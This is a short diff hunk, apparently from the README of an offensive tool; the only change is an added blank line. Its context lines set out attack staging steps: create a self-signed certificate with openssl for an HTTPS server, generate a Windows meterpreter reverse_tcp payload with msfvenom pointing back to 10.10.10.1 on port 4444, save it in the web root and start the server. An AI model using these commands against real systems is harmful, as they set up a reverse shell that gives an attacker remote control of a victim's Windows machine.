@@ -18,6 +18,7 @@ Any web server running HTTPS will suffice. A simple HTTPs web server using pytho
 ```openssl req -new -x509 -keyout yourpemfile.pem -out yourpemfile.pem -days 365 -nodes ```
 
 In /web-server/html generate your desired payload:
+
 ```msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.1 lport=4444 -f raw > payload.txt```
 
 Start the web server:
